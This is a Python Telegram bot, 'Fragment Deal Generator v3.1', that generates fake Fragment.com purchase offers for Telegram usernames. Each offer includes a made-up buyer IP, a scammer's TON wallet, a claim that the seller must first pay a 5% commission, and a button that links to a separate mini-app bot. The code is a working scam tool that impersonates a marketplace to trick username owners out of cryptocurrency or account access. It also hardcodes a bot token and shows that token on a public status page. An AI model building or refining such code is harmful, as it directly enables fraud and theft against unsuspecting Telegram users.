import os
import time
import urllib.request
import json
import asyncio
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"

print(f"🤖 Fragment Deal Generator v3.1 - WEBHOOK FIXED")
print(f"🔑 Token: ✅")
print(f"🎯 Chat ID: {FIXED_CHAT_ID}")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")

# Variables globales
app = None
bot_status = "STARTING"
event_loop = None

# ===== PRIX TON =====
def get_ton_price():
    """Prix TON simplifié"""
    try:
        url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
        with urllib.request.urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            return float(data.get('Price', 5.50))
    except:
        return 5.50

# ===== COMMANDES BOT =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    print(f"📥 START command from user {update.effective_user.id}")
    
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""🤖 **Fragment Deal Generator v3.1**

Hello {user.first_name}! 👋

**Your Chat ID:** `{chat_id}`

**Commands:**
• `/create username price` - Generate Fragment deal
• `/help` - Show help

**Example:**
`/create crypto 1500`

✅ **Bot is ready to work!**"""
        
        await update.message.reply_text(
            message,
            parse_mode='Markdown'
        )
        
        print(f"✅ START response sent to {chat_id}")
        
    except Exception as e:
        print(f"❌ START error: {e}")
        try:
            await update.message.reply_text("❌ Error occurred, please try again.")
        except:
            pass

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create avec toutes les corrections"""
    print(f"📥 CREATE command: {context.args}")
    
    try:
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Wrong format!**\n\n"
                "Use: `/create username price`\n"
                "Example: `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
        
        username = str(context.args[0]).strip().replace('@', '').upper()
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Price must be a number!")
            return
        
        if price <= 0 or price > 1000000:
            await update.message.reply_text("❌ Price must be between 0 and 1,000,000 TON")
            return
        
        # Calculs
        commission = price * 0.05
        ton_price = get_ton_price()
        price_usd = price * ton_price
        commission_usd = commission * ton_price
        
        # Message Fragment avec corrections
        fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
        
        # URL du bouton avec format correct
        button_url = f"https://t.me/BidRequestMiniApp_bot/WebApp?startapp={username.lower()}-{price:g}"
        
        # Bouton avec URL corrigée
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Envoi du message
        await update.message.reply_text(
            fragment_message,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
        
        # Message de confirmation
        await update.message.reply_text(
            f"✅ **Deal Created!**\n\n"
            f"Username: @{username}\n"
            f"Price: {price:g} TON (${price_usd:.2f})\n"
            f"TON Price: ${ton_price:.2f}\n"
            f"Button URL: `{button_url}`",
            parse_mode='Markdown'
        )
        
        print(f"✅ Deal created: @{username} - {price} TON")
        print(f"🔗 Button URL: {button_url}")
        
    except Exception as e:
        print(f"❌ CREATE error: {e}")
        try:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /help"""
    print(f"📥 HELP command from {update.effective_user.id}")
    
    help_text = """📖 **Fragment Deal Generator Help**

**Commands:**
• `/start` - Start the bot
• `/create username price` - Create Fragment deal
• `/help` - Show this help

**Examples:**
• `/create crypto 1500`
• `/create bitcoin 2000.5`

**Features:**
• 💎 Real-time TON price
• 💰 Automatic USD conversion  
• 🧮 5% commission calculation
• 🔗 Clickable TON wallet
• 📱 Integrated WebApp button

✅ **Ready to generate Fragment deals!**"""
    
    try:
        await update.message.reply_text(help_text, parse_mode='Markdown')
        print("✅ HELP sent")
    except Exception as e:
        print(f"❌ HELP error: {e}")

# ===== SERVEUR WEBHOOK =====
class WebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Traitement des webhooks Telegram"""
        try:
            if self.path == f"/{BOT_TOKEN}":
                # Lecture du body
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                
                print(f"📡 Webhook received: {len(post_data)} bytes")
                
                # Parse JSON
                update_data = json.loads(post_data.decode('utf-8'))
                
                # Traitement asyncio via thread
                if update_data:
                    process_update_sync(update_data)
                    print(f"✅ Update processed")
                
                # Réponse OK
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"ok":true}')
                
            else:
                self.send_error(404)
                
        except Exception as e:
            print(f"❌ Webhook error: {e}")
            self.send_error(500)
    
    def do_GET(self):
        """Page de statut"""
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Fragment Bot Status</title>
    <meta charset="utf-8">
    <style>
        body {{ font-family: Arial; margin: 40px; background: #f0f8ff; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 30px; 
                     background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
        .status {{ color: #28a745; font-weight: bold; font-size: 18px; }}
        .info {{ background: #e7f3ff; padding: 15px; border-radius: 5px; margin: 15px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🤖 Fragment Deal Generator v3.1</h1>
        <p class="status">✅ Status: {bot_status}</p>
        <div class="info">
            <p><strong>🔗 Bot:</strong> @BidRequestMiniApp_bot</p>
            <p><strong>📡 Mode:</strong> Webhook</p>
            <p><strong>🌐 System:</strong> Render Cloud</p>
            <p><strong>🕐 Time:</strong> {time.strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
            <p><strong>💎 Target Chat:</strong> {FIXED_CHAT_ID}</p>
            <p><strong>🔄 Event Loop:</strong> {'Active' if event_loop else 'None'}</p>
        </div>
        <p><strong>Webhook URL:</strong> {WEBHOOK_URL}/{BOT_TOKEN}</p>
        <p>Ready to generate Fragment deals! 🚀</p>
        <p><strong>Features:</strong></p>
        <ul>
            <li>✅ TON amounts without "TON" text</li>
            <li>✅ Clickable wallet link</li>
            <li>✅ Correct WebApp button URL</li>
            <li>✅ Real-time TON price</li>
        </ul>
    </div>
</body>
</html>"""
            
            self.wfile.write(html.encode('utf-8'))
            
        except Exception as e:
            print(f"❌ GET error: {e}")
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP"""
        pass

def process_update_sync(update_data):
    """Traitement synchrone pour le serveur HTTP"""
    try:
        if app and event_loop:
            # Création de l'Update
            update = Update.de_json(update_data, app.bot)
            
            if update and event_loop.is_running():
                # Envoi vers la boucle asyncio du bot
                future = asyncio.run_coroutine_threadsafe(
                    process_update_async(update),
                    event_loop
                )
                
                # Attendre le résultat (timeout 10s)
                try:
                    future.result(timeout=10)
                    print(f"✅ Update {update.update_id} processed successfully")
                except asyncio.TimeoutError:
                    print(f"⏰ Update {update.update_id} timeout")
                except Exception as e:
                    print(f"❌ Update {update.update_id} error: {e}")
            else:
                print("❌ No update or event loop not running")
        else:
            print("❌ App or event loop not available")
            
    except Exception as e:
        print(f"❌ Process update sync error: {e}")

async def process_update_async(update: Update):
    """Traitement asyncio des updates"""
    try:
        print(f"🔄 Processing update: {update.update_id}")
        await app.process_update(update)
        print(f"✅ Update {update.update_id} completed")
    except Exception as e:
        print(f"❌ Process update async error: {e}")

# ===== INITIALISATION BOT =====
async def setup_bot():
    """Setup du bot avec webhook"""
    global app, bot_status, event_loop
    
    try:
        print("🤖 Creating bot application...")
        
        # Stockage de la boucle d'événements
        event_loop = asyncio.get_event_loop()
        print(f"🔄 Event loop stored: {event_loop}")
        
        # Création de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout des handlers
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("create", create_command))
        app.add_handler(CommandHandler("help", help_command))
        
        print("✅ Handlers added")
        
        # Initialisation
        await app.initialize()
        print("✅ Bot initialized")
        
        # Test de connexion
        bot_info = await app.bot.get_me()
        print(f"✅ Connected to: @{bot_info.username}")
        
        # Configuration du webhook
        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
        
        try:
            await app.bot.delete_webhook(drop_pending_updates=True)
            print("🗑️ Old webhook deleted")
        except Exception as e:
            print(f"⚠️ Delete webhook error: {e}")
        
        # Attendre 1 seconde
        await asyncio.sleep(1)
        
        await app.bot.set_webhook(url=webhook_url)
        print(f"🔗 Webhook set: {webhook_url}")
        
        # Vérification
        webhook_info = await app.bot.get_webhook_info()
        print(f"📡 Webhook active: {webhook_info.url}")
        
        bot_status = "RUNNING"
        print("✅ Bot ready!")
        
        return True
        
    except Exception as e:
        print(f"❌ Setup error: {e}")
        bot_status = "ERROR"
        return False

async def health_check():
    """Vérification périodique du bot"""
    global bot_status
    
    while True:
        try:
            await asyncio.sleep(30)  # Toutes les 30 secondes
            
            if app and app.bot:
                try:
                    await app.bot.get_me()
                    if bot_status != "RUNNING":
                        bot_status = "RUNNING"
                        print("💚 Bot health check: OK")
                except Exception as e:
                    bot_status = "ERROR"
                    print(f"💔 Bot health check failed: {e}")
            else:
                bot_status = "ERROR"
                print("💔 Bot health check: No app/bot")
                
        except Exception as e:
            print(f"❌ Health check error: {e}")

def run_bot():
    """Thread pour le bot asyncio"""
    global event_loop
    
    try:
        # Nouvelle boucle pour ce thread
        event_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(event_loop)
        
        print("🔄 Bot asyncio loop started")
        
        # Démarrage du bot
        event_loop.run_until_complete(setup_bot())
        
        # Health check en background
        event_loop.create_task(health_check())
        
        # Boucle infinie
        event_loop.run_forever()
        
    except Exception as e:
        print(f"❌ Bot thread error: {e}")
    finally:
        if event_loop:
            event_loop.close()

def run_server():
    """Serveur HTTP avec webhook"""
    try:
        print(f"🌐 Starting HTTP server on port {PORT}...")
        
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        print(f"✅ Server started: http://0.0.0.0:{PORT}")
        
        server.serve_forever()
        
    except Exception as e:
        print(f"❌ Server error: {e}")
        raise

# ===== MAIN =====
def main():
    """Point d'entrée principal"""
    print("🚀 Starting Fragment Deal Generator v3.1...")
    print("=" * 60)
    
    try:
        # Démarrage du bot en thread séparé
        bot_thread = threading.Thread(target=run_bot, daemon=True, name="BotThread")
        bot_thread.start()
        print("✅ Bot thread started")
        
        # Attendre que le bot soit initialisé
        time.sleep(5)
        
        # Démarrage du serveur HTTP (blocking)
        print("🌐 Starting HTTP server...")
        run_server()
        
    except KeyboardInterrupt:
        print("\n🛑 Shutdown requested")
        
    except Exception as e:
        print(f"❌ MAIN ERROR: {e}")
        
    finally:
        print("🔚 Application ended")

if __name__ == '__main__':
    main()
